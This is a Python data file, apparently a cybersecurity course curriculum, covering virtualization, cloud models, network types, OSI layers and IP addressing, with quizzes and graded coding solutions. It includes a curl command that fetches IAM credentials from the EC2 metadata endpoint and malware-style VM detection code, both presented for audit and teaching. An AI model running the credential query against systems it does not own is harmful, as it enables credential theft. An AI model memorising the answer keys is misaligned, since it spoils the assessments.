                    "A data structure storing all metadata about a file (permissions, owner, size, physical block pointers) except its name and actual contents",
                    "A virus scanner for USB drives",
                    "A special keyboard shortcut to open the terminal",
                    "The power button on the server chassis"
                ],
                "correct_answer": "A data structure storing all metadata about a file (permissions, owner, size, physical block pointers) except its name and actual contents",
                "explanation": "In Unix/Linux, directories link human-readable filenames to numerical inode numbers, which point to metadata and storage blocks."
            },
            {
                "question": "In a Linux permission string `-rwxr-xr--`, what permission does the 'World / Others' category have?",
                "options": ["Read only (`r--`)", "Read and execute (`r-x`)", "Read, write, and execute (`rwx`)", "No permissions (`---`)"],
                "correct_answer": "Read only (`r--`)",
                "explanation": "The permission string is grouped into 3 triads: Owner (`rwx`), Group (`r-x`), and Others (`r--`). The last three characters are `r--`."
            },
            {
                "question": "What is a 'Path Traversal' (or Directory Traversal) attack?",
                "options": [
                    "An attack using characters like `../` to access directories and confidential files outside the intended web root folder",
                    "Stealing physical hard drives from an office",
                    "Renaming files so users cannot find them",
                    "Flooding a folder with millions of empty files"
                ],
                "correct_answer": "An attack using characters like `../` to access directories and confidential files outside the intended web root folder",
                "explanation": "Dot-dot-slash (`../`) allows navigating upward into parent directories, bypassing application boundaries to read files like `/etc/passwd`."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 6: Virtualization Basics (Hypervisors & Virtual Machines)
    # ---------------------------------------------------------
    DayBlueprint(
        order=6,
        title="Day 6: Virtualization Basics (Hypervisors & Virtual Machines)",
        concept="Understanding how virtualization decouples software and operating systems from physical hardware using Type 1 (bare-metal) and Type 2 (hosted) hypervisors, and exploring virtual machine isolation for malware analysis.",
        analogy="Physical hardware without virtualization is like a single-family house where only one person can live at a time. A hypervisor is a master architect who divides the house into 5 soundproof apartments (Virtual Machines), each with its own front door, kitchen, and thermostat, sharing the building's water and power pipes.",
        theory_sections=[
            {
                "heading": "Hypervisors: Type 1 vs Type 2",
                "content": (
                    "Virtualization allows running multiple independent operating systems concurrently on a single physical host:\n\n"
                    "1. **Type 1 Hypervisor (Bare-Metal)**: Installs directly onto the physical server hardware with zero underlying host OS. Examples: VMware ESXi, Microsoft Hyper-V, Proxmox VE, KVM. Used in enterprise datacenters for maximum speed, security, and low latency.\n"
                    "2. **Type 2 Hypervisor (Hosted)**: Runs as an application inside a regular desktop operating system (Windows/macOS/Linux). Examples: Oracle VirtualBox, VMware Workstation. Used by students, analysts, and developers."
                )
            },
            {
                "heading": "Cybersecurity Use Cases: Sandboxing & VM Escape",
                "content": (
                    "- **Malware Analysis Sandbox**: Security researchers execute unknown ransomware inside an isolated VM. If the VM is infected, researchers take memory dumps, analyze behavior, and instantly restore the VM to a clean **Snapshot**.\n"
                    "- **VM Escape Vulnerabilities**: A critical security flaw where malicious code running inside a guest virtual machine breaks out through the hypervisor barrier to take over the host operating system."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Managing Virtual Machines via CLI (VBoxManage & Virsh)",
                "language": "bash",
                "code": (
                    "# Oracle VirtualBox CLI (VBoxManage):\n"
                    "VBoxManage list vms\n"
                    "VBoxManage startvm \"Malware_Lab_Win10\" --type headless\n"
                    "VBoxManage snapshot \"Malware_Lab_Win10\" restore \"Clean_State_Snapshot\"\n\n"
                    "# Linux KVM / QEMU CLI (virsh):\n"
                    "virsh list --all\n"
                    "virsh snapshot-list Windows_Sandbox"
                ),
                "explanation": "Automating virtual machine lifecycle operations allows SOC analysts to spin up clean testing sandboxes on demand."
            },
            {
                "title": "Python: Detecting if Code is Running Inside a Virtual Machine",
                "language": "python",
                "code": (
                    "import subprocess\n\n"
                    "def check_vm_artifacts():\n"
                    "    # Malware queries BIOS serials and MAC addresses to check for VMs\n"
                    "    known_vm_vendors = ['vmware', 'virtualbox', 'qemu', 'xen', 'vbox']\n"
                    "    try:\n"
                    "        out = subprocess.check_output('wmic bios get serialnumber', shell=True).decode().lower()\n"
                    "        for vendor in known_vm_vendors:\n"
                    "            if vendor in out:\n"
                    "                return True\n"
                    "    except Exception:\n"
                    "        pass\n"
                    "    return False\n\n"
                    "print('Is Virtual Machine:', check_vm_artifacts())"
                ),
                "explanation": "Malware frequently includes anti-analysis techniques to detect hypervisors and refuse to detonate inside a security researcher's sandbox."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `detect_sandbox_indicators(mac_address: str, installed_drivers: list) -> bool` that returns True if the MAC address begins with a known VM vendor prefix ('08:00:27' for VirtualBox, '00:05:69' for VMware) or if 'vboxmouse.sys' is in drivers.",
            "starter_code": (
                "def detect_sandbox_indicators(mac_address: str, installed_drivers: list) -> bool:\n"
                "    # Return True if VM indicators are detected\n"
                "    return False\n\n"
                "print(detect_sandbox_indicators('08:00:27:11:22:33', ['disk.sys']))\n"
                "print(detect_sandbox_indicators('AA:BB:CC:DD:EE:FF', ['disk.sys']))"
            ),
            "solution_code": (
                "def detect_sandbox_indicators(mac_address: str, installed_drivers: list) -> bool:\n"
                "    vm_prefixes = ('08:00:27', '00:05:69', '00:50:56')\n"
                "    clean_mac = mac_address.lower()\n"
                "    if any(clean_mac.startswith(prefix.lower()) for prefix in vm_prefixes):\n"
                "        return True\n"
                "    vm_drivers = {'vboxmouse.sys', 'vboxguest.sys', 'vmmouse.sys'}\n"
                "    for driver in installed_drivers:\n"
                "        if driver.lower() in vm_drivers:\n"
                "            return True\n"
                "    return False\n\n"
                "print(detect_sandbox_indicators('08:00:27:11:22:33', ['disk.sys']))\n"
                "print(detect_sandbox_indicators('AA:BB:CC:DD:EE:FF', ['disk.sys']))"
            ),
            "expected_output": "True\nFalse"
        },
        quizzes=[
            {
                "question": "What is the primary difference between a Type 1 and Type 2 Hypervisor?",
                "options": [
                    "Type 1 runs directly on the bare-metal physical hardware without a host OS, whereas Type 2 runs on top of an existing host operating system",
                    "Type 1 is only for Apple laptops, Type 2 is for Android",
                    "Type 2 can run without any physical RAM",
                    "Type 1 does not allow virtual machines to have internet access"
                ],
                "correct_answer": "Type 1 runs directly on the bare-metal physical hardware without a host OS, whereas Type 2 runs on top of an existing host operating system",
                "explanation": "Type 1 hypervisors (ESXi, Hyper-V) sit directly on the physical CPU/memory for enterprise efficiency, while Type 2 (VirtualBox) runs as an app on Windows or macOS."
            },
            {
                "question": "Why do security researchers execute suspicious malware files inside a Virtual Machine?",
                "options": [
                    "To safely observe malicious behavior in an isolated environment without risking infection of the host machine or corporate network",
                    "Because malware runs faster inside a VM",
                    "Because VMs automatically cure all viruses",
                    "Because VMs make malware permanently harmless"
                ],
                "correct_answer": "To safely observe malicious behavior in an isolated environment without risking infection of the host machine or corporate network",
                "explanation": "Sandboxing inside isolated VMs contains payloads, allowing memory/packet inspection and quick snapshot reversion."
            },
            {
                "question": "What is a 'Snapshot' in virtual machine management?",
                "options": [
                    "A preserved point-in-time state of the virtual machine's virtual disk and memory that can be instantly restored",
                    "A screenshot saved to the desktop",
                    "A printout of the CPU schematic",
                    "A photograph of the computer taken with a webcam"
                ],
                "correct_answer": "A preserved point-in-time state of the virtual machine's virtual disk and memory that can be instantly restored",
                "explanation": "Snapshots capture disk differences and memory state, allowing users to roll back unwanted system modifications or infections in seconds."
            },
            {
                "question": "What is a 'Virtual Machine Escape' vulnerability?",
                "options": [
                    "A critical vulnerability where exploit code inside a guest VM escapes the hypervisor sandbox and executes code on the host operating system",
                    "When a laptop is stolen from an office",
                    "Closing the VirtualBox window without saving",
                    "Turning off the Wi-Fi router"
                ],
                "correct_answer": "A critical vulnerability where exploit code inside a guest VM escapes the hypervisor sandbox and executes code on the host operating system",
                "explanation": "VM Escape breaks the core isolation boundary of hypervisors, representing the highest severity threat in multi-tenant cloud environments."
            },
            {
                "question": "Why does sophisticated malware search for files like `VBoxGuestAdditions.sys` or specific VMware registry keys upon execution?",
                "options": [
                    "To detect if it is being analyzed in a researcher's sandbox, shutting down or acting benign to evade detection",
                    "To update its own features from Oracle's website",
                    "To improve graphics performance",
                    "To register for technical support"
                ],
                "correct_answer": "To detect if it is being analyzed in a researcher's sandbox, shutting down or acting benign to evade detection",
                "explanation": "Anti-analysis and anti-VM logic allows malware to hide its malicious capabilities when it realizes it is inside an analyst's virtual environment."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 7: Cloud Computing Basics (IaaS, PaaS, SaaS)
    # ---------------------------------------------------------
    DayBlueprint(
        order=7,
        title="Day 7: Cloud Computing Basics (IaaS, PaaS, SaaS)",
        concept="Understanding the cloud service models (IaaS, PaaS, SaaS), cloud deployment models (Public, Private, Hybrid), and the fundamental Cloud Shared Responsibility Model in cybersecurity.",
        analogy="Think of dining: On-premises is cooking dinner at home from scratch (you own the stove, buy ingredients, wash dishes). IaaS is renting a professional commercial kitchen (they provide stove and gas, you bring chef and food). PaaS is ordering pizza delivery (they cook it, you just eat it). SaaS is eating at a buffet restaurant (they do everything, you just pick up a fork).",
        theory_sections=[
            {
                "heading": "The Three Core Cloud Service Models",
                "content": (
                    "Cloud computing delivers on-demand computing services over the internet with pay-as-you-go pricing:\n\n"
                    "1. **IaaS (Infrastructure as a Service)**: Provides raw virtualized hardware: virtual machines, raw block storage, and virtual networks. You manage the OS, patches, and apps. Examples: AWS EC2, Azure VMs, Google Compute Engine.\n"
                    "2. **PaaS (Platform as a Service)**: Provides an environment to develop, run, and manage applications without dealing with infrastructure or OS patching. Examples: AWS Elastic Beanstalk, Heroku, Google App Engine.\n"
                    "3. **SaaS (Software as a Service)**: Complete, end-user applications delivered over a web browser. The cloud provider manages everything. Examples: Microsoft 365, Google Workspace, Salesforce, Dropbox."
                )
            },
            {
                "heading": "The Cloud Shared Responsibility Model",
                "content": (
                    "Who is responsible if a company's cloud database is breached?\n"
                    "- **Cloud Provider (AWS/Azure/GCP)**: Responsible for **Security OF the Cloud** (physical datacenters, biometric door locks, hypervisors, underlying hardware, power).\n"
                    "- **Customer (Your Company)**: Responsible for **Security IN the Cloud** (customer data, IAM credentials, firewall configurations, OS patches on IaaS, encryption keys).\n"
                    "Over 95% of cloud security failures occur because customers misconfigure their own security settings (e.g., leaving an Amazon S3 storage bucket open to the public)."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Querying Cloud Metadata & S3 Bucket Permissions via AWS CLI",
                "language": "bash",
                "code": (
                    "# Querying AWS EC2 instance metadata (IMDSv2):\n"
                    "TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\n"
                    "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n"
                    "# Auditing public access block on an S3 Bucket:\n"
                    "aws s3api get-public-access-block --bucket company-confidential-backups"
                ),
                "explanation": "Cloud security audits verify that instances cannot have their IAM roles stolen via SSRF attacks and buckets are not publicly exposed."
            },
            {
                "title": "Python: Auditing Public S3 Buckets for Data Leaks",
                "language": "python",
                "code": (
                    "import requests\n\n"
                    "def check_bucket_exposure(bucket_name: str):\n"
                    "    url = f'https://{bucket_name}.s3.amazonaws.com'\n"
                    "    try:\n"
                    "        resp = requests.get(url, timeout=5)\n"
                    "        if resp.status_code == 200 and '<ListBucketResult' in resp.text:\n"
                    "            return f'CRITICAL: {bucket_name} is publicly readable and listing files!'\n"
                    "        elif resp.status_code == 403:\n"
                    "            return f'SECURE: {bucket_name} access denied (private).'\n"
                    "        return f'INFO: HTTP {resp.status_code}'\n"
                    "    except Exception as e:\n"
                    "        return f'Error: {e}'\n\n"
                    "print(check_bucket_exposure('test-company-public-assets'))"
                ),
                "explanation": "Automated security scanners continuously monitor company cloud assets for accidental public exposure."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `shared_responsibility_lookup(service_model: str, layer: str) -> str` that determines who is responsible ('PROVIDER' or 'CUSTOMER') for a specific layer ('PHYSICAL_HARDWARE', 'OS_PATCHING', 'USER_DATA') under IaaS, PaaS, or SaaS.",
            "starter_code": (
                "def shared_responsibility_lookup(service_model: str, layer: str) -> str:\n"
                "    # Return 'PROVIDER' or 'CUSTOMER'\n"
                "    return ''\n\n"
                "print(shared_responsibility_lookup('IaaS', 'OS_PATCHING'))\n"
                "print(shared_responsibility_lookup('SaaS', 'OS_PATCHING'))"
            ),
            "solution_code": (
                "def shared_responsibility_lookup(service_model: str, layer: str) -> str:\n"
                "    if layer == 'PHYSICAL_HARDWARE':\n"
                "        return 'PROVIDER'\n"
                "    if layer == 'USER_DATA':\n"
                "        return 'CUSTOMER'\n"
                "    if layer == 'OS_PATCHING':\n"
                "        return 'CUSTOMER' if service_model == 'IaaS' else 'PROVIDER'\n"
                "    return 'CUSTOMER'\n\n"
                "print(shared_responsibility_lookup('IaaS', 'OS_PATCHING'))\n"
                "print(shared_responsibility_lookup('SaaS', 'OS_PATCHING'))"
            ),
            "expected_output": "CUSTOMER\nPROVIDER"
        },
        quizzes=[
            {
                "question": "In the Cloud Shared Responsibility Model, which party is ALWAYS responsible for securing customer data, user credentials, and access permissions?",
                "options": [
                    "The Customer (Organization)",
                    "The Cloud Provider (e.g., AWS, Azure, Google Cloud)",
                    "The Internet Service Provider (ISP)",
                    "The local police department"
                ],
                "correct_answer": "The Customer (Organization)",
                "explanation": "Regardless of whether using IaaS, PaaS, or SaaS, the customer always retains ownership and security responsibility for their own data and user credentials."
            },
            {
                "question": "Which cloud computing model provides raw virtual machines and virtual networks, leaving operating system installation and patching to the customer?",
                "options": ["IaaS (Infrastructure as a Service)", "SaaS (Software as a Service)", "PaaS (Platform as a Service)", "FaaS (Function as a Service)"],
                "correct_answer": "IaaS (Infrastructure as a Service)",
                "explanation": "IaaS provides bare virtual computing and networking instances (like AWS EC2). The customer is responsible for managing the guest OS and patches."
            },
            {
                "question": "Microsoft 365, Google Workspace, and Salesforce are prime examples of which cloud service tier?",
                "options": ["SaaS (Software as a Service)", "IaaS (Infrastructure as a Service)", "PaaS (Platform as a Service)", "Bare-metal hosting"],
                "correct_answer": "SaaS (Software as a Service)",
                "explanation": "SaaS provides ready-to-use end-user applications accessed via web browsers where the provider manages all underlying infrastructure and application code."
            },
            {
                "question": "What is the single most common root cause of data breaches in corporate cloud environments?",
                "options": [
                    "Customer misconfigurations, such as publicly exposed storage buckets or overly permissive IAM policies",
                    "Physical break-ins at AWS datacenters",
                    "Fiber optic cables in the ocean being severed by sharks",
                    "Solar flares destroying cloud hard drives"
                ],
                "correct_answer": "Customer misconfigurations, such as publicly exposed storage buckets or overly permissive IAM policies",
                "explanation": "Cloud providers heavily secure physical infrastructure; breaches overwhelmingly occur due to customer errors, misconfigured access controls, and leaked API keys."
            },
            {
                "question": "What is a 'Hybrid Cloud' deployment?",
                "options": [
                    "An architecture combining on-premises private datacenter infrastructure with one or more public cloud providers",
                    "A computer powered by both solar and gasoline energy",
                    "A laptop connected to two different Wi-Fi networks at once",
                    "Using both Windows and macOS on the same desk"
                ],
                "correct_answer": "An architecture combining on-premises private datacenter infrastructure with one or more public cloud providers",
                "explanation": "Hybrid cloud links on-premises private servers with public cloud services (AWS/Azure) to allow data and application sharing."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 8: Network Types (LAN, WAN, PAN, WLAN)
    # ---------------------------------------------------------
    DayBlueprint(
        order=8,
        title="Day 8: Network Types (LAN, WAN, PAN, WLAN)",
        concept="Classifying computer networks by geographic scope (PAN, LAN, WLAN, WAN), exploring topology architectures, and understanding the security perimeters associated with each network type.",
        analogy="Think of communication ranges: PAN (Personal Area Network) is whispering to your watch on your wrist. LAN is talking to family inside your house. WLAN is yelling to neighbors across your backyard with a megaphone. WAN is calling someone in Australia via the international telecom satellite network.",
        theory_sections=[
            {
                "heading": "Geographic Network Classifications",
                "content": (
                    "Networks connect computing devices to share resources across specific physical boundaries:\n\n"
                    "1. **PAN (Personal Area Network)**: Centered around a single individual within ~10 meters. Uses Bluetooth, NFC, or USB. Examples: Wireless earbuds paired with a smartphone, smartwatch health sync.\n"
                    "2. **LAN (Local Area Network)**: High-speed interconnected devices within a single building or room. Uses Ethernet cables (Cat6) and local switches. Offers high bandwidth and low latency.\n"
                    "3. **WLAN (Wireless Local Area Network)**: A LAN that uses radio frequency (Wi-Fi 802.11 standards) instead of physical cables via Wireless Access Points (WAPs).\n"
                    "4. **WAN (Wide Area Network)**: Spans broad geographic regions, cities, or countries. The global Internet is the world's largest WAN. Operates via fiber undersea cables, satellites, and ISP routers."
                )
            },
            {
                "heading": "Security Perimeters by Network Type",
                "content": (
                    "- **WLAN Risks**: Radio waves leak outside the physical walls of an office. Anyone in the parking lot can capture encrypted frames or set up a rogue **Evil Twin** access point.\n"
                    "- **PAN Risks**: **Bluesnarfing** and **Bluejacking** exploit Bluetooth pairing vulnerabilities to siphon contacts and text messages without the user's awareness."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Scanning Local Network Interfaces and Wi-Fi SSIDs",
                "language": "bash",
                "code": (
                    "# Windows: Inspecting Wi-Fi profiles and network adapters:\n"
                    "netsh wlan show networks\n"
                    "netsh wlan show interfaces\n"
                    "Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, LinkSpeed\n\n"
                    "# Linux: Discovering wireless networks and signal quality:\n"
                    "iwlist wlan0 scan | grep -E 'ESSID|Quality|Encryption'"
                ),
                "explanation": "Network administrators use native CLI tools to survey wireless environments and verify secure encryption standards."
            },
            {
                "title": "Python: Classifying Network Scope by Subnet Mask",
                "language": "python",
                "code": (
                    "import ipaddress\n\n"
                    "def classify_ip_scope(ip_str: str) -> str:\n"
                    "    ip = ipaddress.ip_address(ip_str)\n"
                    "    if ip.is_private:\n"
                    "        return 'LAN / Private Corporate Subnet'\n"
                    "    elif ip.is_loopback:\n"
                    "        return 'Host Loopback (Internal to device)'\n"
                    "    else:\n"
                    "        return 'WAN / Public Internet Address'\n\n"
                    "print(classify_ip_scope('192.168.1.50'))\n"
                    "print(classify_ip_scope('8.8.8.8'))"
                ),
                "explanation": "Uses standard `ipaddress` to verify whether an IP address belongs to internal private LAN space or public WAN internet."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `network_type_selector(distance_meters: float, is_wireless: bool) -> str` that returns 'PAN' if distance <= 10, 'WLAN' if distance <= 100 and wireless, 'LAN' if distance <= 100 and wired, and 'WAN' if distance > 100.",
            "starter_code": (
                "def network_type_selector(distance_meters: float, is_wireless: bool) -> str:\n"
                "    # Return 'PAN', 'LAN', 'WLAN', or 'WAN'\n"
                "    return ''\n\n"
                "print(network_type_selector(5.0, True))\n"
                "print(network_type_selector(50.0, True))\n"
                "print(network_type_selector(50.0, False))\n"
                "print(network_type_selector(5000.0, False))"
            ),
            "solution_code": (
                "def network_type_selector(distance_meters: float, is_wireless: bool) -> str:\n"
                "    if distance_meters <= 10:\n"
                "        return 'PAN'\n"
                "    elif distance_meters <= 100:\n"
                "        return 'WLAN' if is_wireless else 'LAN'\n"
                "    else:\n"
                "        return 'WAN'\n\n"
                "print(network_type_selector(5.0, True))\n"
                "print(network_type_selector(50.0, True))\n"
                "print(network_type_selector(50.0, False))\n"
                "print(network_type_selector(5000.0, False))"
            ),
            "expected_output": "PAN\nWLAN\nLAN\nWAN"
        },
        quizzes=[
            {
                "question": "Which network type is specifically designed for short-range personal devices (within approximately 10 meters) using Bluetooth or NFC?",
                "options": ["PAN (Personal Area Network)", "WAN (Wide Area Network)", "MAN (Metropolitan Area Network)", "LAN (Local Area Network)"],
                "correct_answer": "PAN (Personal Area Network)",
                "explanation": "A Personal Area Network (PAN) interconnects devices centered on an individual person's workspace over short ranges."
            },
            {
                "question": "What is the global Internet classified as?",
                "options": ["A WAN (Wide Area Network)", "A LAN (Local Area Network)", "A PAN (Personal Area Network)", "A SAN (Storage Area Network)"],
                "correct_answer": "A WAN (Wide Area Network)",
                "explanation": "The Internet is the ultimate WAN, spanning international borders across undersea cables, satellite links, and telecom backbones."
            },
            {
                "question": "From a security standpoint, why is a WLAN inherently more vulnerable to unauthorized eavesdropping than a wired LAN?",
                "options": [
                    "WLAN radio waves pass through office walls and can be captured by attackers in parking lots without physical cable taps",
                    "WLAN does not support passwords",
                    "WLAN cables can be easily unplugged",
                    "WLAN devices can never use encryption"
                ],
                "correct_answer": "WLAN radio waves pass through office walls and can be captured by attackers in parking lots without physical cable taps",
                "explanation": "Wi-Fi signals extend beyond physical security boundaries, allowing attackers to sniff frames or launch rogue AP attacks without entering the facility."
            },
            {
                "question": "What hardware device connects individual wired computers together inside a single office Local Area Network (LAN)?",
                "options": ["A Network Switch", "A Satellite dish", "A RAM module", "A Bluetooth dongle"],
                "correct_answer": "A Network Switch",
                "explanation": "Network switches operate at Layer 2, forwarding Ethernet frames between connected devices inside a local network."
            },
            {
                "question": "What attack involves deploying an unauthorized Wi-Fi access point that mimics a legitimate company or coffee shop network name (SSID)?",
                "options": ["Evil Twin Attack", "Buffer Overflow", "SQL Injection", "Cold Boot Attack"],
                "correct_answer": "Evil Twin Attack",
                "explanation": "An Evil Twin mimics a trusted SSID (e.g., 'Starbucks_Guest'). Victims connect automatically, allowing the attacker to intercept all cleartext traffic."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 9: OSI Model & TCP/IP Model Overview
    # ---------------------------------------------------------
    DayBlueprint(
        order=9,
        title="Day 9: OSI Model & TCP/IP Model Overview",
        concept="Mastering the 7 layers of the OSI reference model and the 4 layers of the practical TCP/IP suite, understanding data encapsulation/de-encapsulation, and mapping security controls to specific layers.",
        analogy="Sending an email across the OSI model is like mailing a sealed letter: Layer 7 is writing the letter. Layer 6 is translating it to French. Layer 5 is starting the conversation. Layer 4 is choosing certified mail (TCP). Layer 3 is writing the street address (IP). Layer 2 is putting it into the delivery postal van (Ethernet frame). Layer 1 is the physical highway asphalt asphalt (radio waves/copper wire).",
        theory_sections=[
            {
                "heading": "The 7 Layers of the OSI Model (Please Do Not Throw Sausage Pizza Away)",
                "content": (
                    "The Open Systems Interconnection (OSI) model standardizes network communication:\n\n"
                    "7. **Application**: High-level network APIs and user protocols (HTTP, HTTPS, DNS, SSH, SMTP).\n"
                    "6. **Presentation**: Data formatting, character encoding (ASCII/UTF-8), compression, and encryption (TLS).\n"
                    "5. **Session**: Manages dialogue control, connection establishment, termination, and sync checkpoints.\n"
                    "4. **Transport**: End-to-end transport and flow control. **TCP** (reliable, 3-way handshake) vs **UDP** (connectionless, fast).\n"
                    "3. **Network**: Logical addressing (IPv4/IPv6) and routing across disparate networks via routers.\n"
                    "2. **Data Link**: Physical hardware addressing (**MAC addresses**) and framing. Handled by network switches.\n"
                    "1. **Physical**: Raw electrical voltages, optical light pulses, or RF radio waves across physical cables."
                )
            },
            {
                "heading": "The 4-Layer TCP/IP Model & Encapsulation",
                "content": (
                    "The Internet runs on the streamlined 4-layer TCP/IP stack:\n"
                    "1. Application (OSI 5-7) -> Data\n"
                    "2. Transport (OSI 4) -> **Segment** (adds Port numbers)\n"
                    "3. Internet (OSI 3) -> **Packet** (adds IP addresses)\n"
                    "4. Network Access (OSI 1-2) -> **Frame** (adds MAC addresses and CRC checksum)\n\n"
                    "As data moves down the stack, each layer wraps the payload in its own protocol header (**Encapsulation**)."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Mapping Attacks and Defenses to the OSI Stack",
                "language": "bash",
                "code": (
                    "# Layer 7 (Application): SQLi, XSS, DDoS -> Defense: Web Application Firewall (WAF)\n"
                    "# Layer 4 (Transport): SYN Flood, Port Scanning -> Defense: Stateful Firewall\n"
                    "# Layer 3 (Network): IP Spoofing, Ping of Death -> Defense: Router ACLs, IPsec\n"
                    "# Layer 2 (Data Link): ARP Poisoning, MAC Flooding -> Defense: Dynamic ARP Inspection (DAI)\n"
                    "# Layer 1 (Physical): Cable Tapping, Jamming -> Defense: Fiber optic, physical door locks"
                ),
                "explanation": "Defense-in-depth requires placing distinct security controls at every layer of the network model."
            },
            {
                "title": "Python: Simulating Network Packet Encapsulation",
                "language": "python",
                "code": (
                    "def encapsulate_message(payload: str, src_ip: str, dst_ip: str, port: int) -> dict:\n"
                    "    # Layer 7 Data\n"
                    "    data = payload\n"
                    "    # Layer 4 Segment\n"
                    "    segment = {'dst_port': port, 'payload': data}\n"
                    "    # Layer 3 Packet\n"
                    "    packet = {'src_ip': src_ip, 'dst_ip': dst_ip, 'transport_segment': segment}\n"
                    "    # Layer 2 Frame\n"
                    "    frame = {'src_mac': '00:11:22:33:44:55', 'dst_mac': 'FF:FF:FF:FF:FF:FF', 'packet': packet}\n"
                    "    return frame\n\n"
                    "import pprint\n"
                    "pprint.pprint(encapsulate_message('GET /index.html', '192.168.1.10', '93.184.216.34', 443))"
                ),
                "explanation": "Demonstrates programmatic encapsulation where higher-layer payloads are nested inside transport and internet headers."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `get_osi_pdu(layer_number: int) -> str` that returns the Protocol Data Unit (PDU) name for the given OSI layer: Layer 7 ('Data'), Layer 4 ('Segment'), Layer 3 ('Packet'), Layer 2 ('Frame'), Layer 1 ('Bits'). For any other layer number, return 'Data'.",
            "starter_code": (
                "def get_osi_pdu(layer_number: int) -> str:\n"
                "    # Return 'Data', 'Segment', 'Packet', 'Frame', or 'Bits'\n"
                "    return ''\n\n"
                "print(get_osi_pdu(4))\n"
                "print(get_osi_pdu(3))\n"
                "print(get_osi_pdu(2))\n"
                "print(get_osi_pdu(1))"
            ),
            "solution_code": (
                "def get_osi_pdu(layer_number: int) -> str:\n"
                "    pdus = {\n"
                "        1: 'Bits',\n"
                "        2: 'Frame',\n"
                "        3: 'Packet',\n"
                "        4: 'Segment',\n"
                "        5: 'Data',\n"
                "        6: 'Data',\n"
                "        7: 'Data'\n"
                "    }\n"
                "    return pdus.get(layer_number, 'Data')\n\n"
                "print(get_osi_pdu(4))\n"
                "print(get_osi_pdu(3))\n"
                "print(get_osi_pdu(2))\n"
                "print(get_osi_pdu(1))"
            ),
            "expected_output": "Segment\nPacket\nFrame\nBits"
        },
        quizzes=[
            {
                "question": "At which OSI model layer do IP addresses and routers operate?",
                "options": ["Layer 3 (Network Layer)", "Layer 2 (Data Link Layer)", "Layer 4 (Transport Layer)", "Layer 7 (Application Layer)"],
                "correct_answer": "Layer 3 (Network Layer)",
                "explanation": "Layer 3 is the Network Layer, responsible for logical addressing (IPv4/IPv6) and path routing across networks."
            },
            {
                "question": "What is the specific Protocol Data Unit (PDU) name at Layer 2 (Data Link Layer)?",
                "options": ["Frame", "Packet", "Segment", "Bit"],
                "correct_answer": "Frame",
                "explanation": "Data at Layer 2 is organized into 'Frames', which include source/destination MAC addresses and error-checking checksums."
            },
            {
                "question": "Which transport layer protocol guarantees reliable, ordered data delivery using a 3-way handshake (SYN, SYN-ACK, ACK)?",
                "options": ["TCP (Transmission Control Protocol)", "UDP (User Datagram Protocol)", "ICMP (Internet Control Message Protocol)", "ARP (Address Resolution Protocol)"],
                "correct_answer": "TCP (Transmission Control Protocol)",
                "explanation": "TCP is connection-oriented, providing retransmission of dropped packets and sequence ordering via acknowledgments."
            },
            {
                "question": "What happens during the 'Encapsulation' process when data travels down the OSI stack?",
                "options": [
                    "Each lower layer wraps the incoming data unit in its own protocol header and optional trailer",
                    "The computer deletes all vowels in the message",
                    "The data is converted into a PDF document",
                    "The hard drive is formatted"
                ],
                "correct_answer": "Each lower layer wraps the incoming data unit in its own protocol header and optional trailer",
                "explanation": "Encapsulation packages application data into segments (L4), packets (L3), frames (L2), and electrical/optical bits (L1)."
            },
            {
                "question": "At which layer of the OSI model does a Web Application Firewall (WAF) inspect HTTP headers and SQL injection payloads?",
                "options": ["Layer 7 (Application Layer)", "Layer 3 (Network Layer)", "Layer 1 (Physical Layer)", "Layer 2 (Data Link Layer)"],
                "correct_answer": "Layer 7 (Application Layer)",
                "explanation": "WAFs operate at Layer 7, deeply analyzing web application payloads like HTTP requests, cookie headers, and JSON bodies."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 10: IP Addressing (IPv4, IPv6) & MAC Addresses
    # ---------------------------------------------------------
    DayBlueprint(
        order=10,
        title="Day 10: IP Addressing (IPv4, IPv6) & MAC Addresses",
        concept="Differentiating between logical Layer 3 addresses (IPv4 vs IPv6), physical Layer 2 hardware addresses (MAC addresses), private RFC 1918 subnets, and Network Address Translation (NAT).",
        analogy="Your MAC address is like your permanent biometric National ID number or DNA—burned into your physical network card at the factory. Your IP address is like your current mailing address: if you move to a new apartment or coffee shop, your mailing address changes, but your biometric ID remains identical.",
        theory_sections=[
            {
                "heading": "IPv4 vs IPv6 Addressing",
                "content": (
                    "Every connected device requires a numerical logical network identifier:\n\n"
                    "1. **IPv4 (32-bit address)**: Expressed as 4 decimal octets separated by dots (e.g., `192.168.1.1`). Offers approximately 4.3 billion unique addresses, which have been completely exhausted.\n"
                    "2. **IPv6 (128-bit address)**: Expressed as 8 groups of 4 hexadecimal digits separated by colons (e.g., `2001:0db8:85a3:0000:0000:8a2e:0370:7334`). Provides 340 undecillion addresses—virtually limitless.\n"
                    "3. **Private IP Ranges (RFC 1918)**: Non-routable on the public internet:\n"
                    "   - Class A: `10.0.0.0` - `10.255.255.255`\n"
                    "   - Class B: `172.16.0.0` - `172.31.255.255`\n"
                    "   - Class C: `192.168.0.0` - `192.168.255.255`\n"
                    "4. **NAT (Network Address Translation)**: Allows thousands of internal private devices to share a single public routable IPv4 address."
                )
            },
            {
                "heading": "MAC Addresses & Spoofing Risks",
                "content": (
                    "A **MAC (Media Access Control) Address** is a 48-bit physical identifier (e.g., `00:1A:2B:3C:4D:5E`):\n"
                    "- First 24 bits: **OUI (Organizationally Unique Identifier)** identifying the manufacturer (Intel, Apple, Cisco).\n"
                    "- Last 24 bits: Unique device serial number.\n"
                    "- **MAC Spoofing**: Attackers easily overwrite their NIC's reported MAC address in software to bypass MAC-filtering firewalls or hijack hotel pay-per-day Wi-Fi sessions."
                )
            }
        ],
        code_snippets=[
            {
